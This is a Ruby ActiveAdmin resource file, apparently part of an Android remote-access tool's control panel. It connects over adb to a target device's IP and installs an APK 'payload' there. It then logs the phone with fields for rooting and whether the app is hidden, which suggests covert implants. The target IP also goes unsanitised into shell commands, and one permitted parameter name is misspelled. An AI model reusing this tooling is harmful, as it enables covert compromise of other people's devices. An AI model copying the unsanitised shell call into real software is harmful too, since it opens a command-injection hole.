ActiveAdmin.register ApkInstallation do
    menu priority: 1, label: "Install APK", parent: "Actions"

    after_create do |apk_installation|
        @apk_payload = ApkPayload.find(apk_installation.apk_payload_id)

        puts "Killing adb server.."
        system("tools\\platform-tools\\adb kill-server")
        sleep(1)

        puts "Starting adb server.."
        system("tools\\platform-tools\\adb start-server")
        sleep(1)

        puts "Connecting to device.."
        system("tools\\platform-tools\\adb connect #{apk_installation.target_ip}")
        sleep(5)
        puts "Installing apk.."
        system("tools\\platform-tools\\adb install payloads\\#{@apk_payload.name}.apk")
        puts "Done"

        newSmartphone=Smartphone.new(:operating_system => 'Unknown',:name => 'Smartphone',:is_rooted => 'False',:is_app_hidden => 'False',:apk_installation_id => apk_installation.id,:created_at => '2003-05-03 00:00:00',:updated_at => '2003-05-03 00:00:00')
        newSmartphone.save!

        
    end

  # See permitted parameters documentation:
  # https://github.com/activeadmin/activeadmin/blob/master/docs/2-resource-customization.md#setting-up-strong-parameters
  #
  # Uncomment all parameters which should be permitted for assignment
  #
  permit_params :taget_ip, :status, :apk_payload_id
  #
  # or
  #
  # permit_params do
  #   permitted = [:target_ip, :status, :apk_payload_id]
  #   permitted << :other if params[:action] == 'create' && current_user.admin?
  #   permitted
  # end
  
end
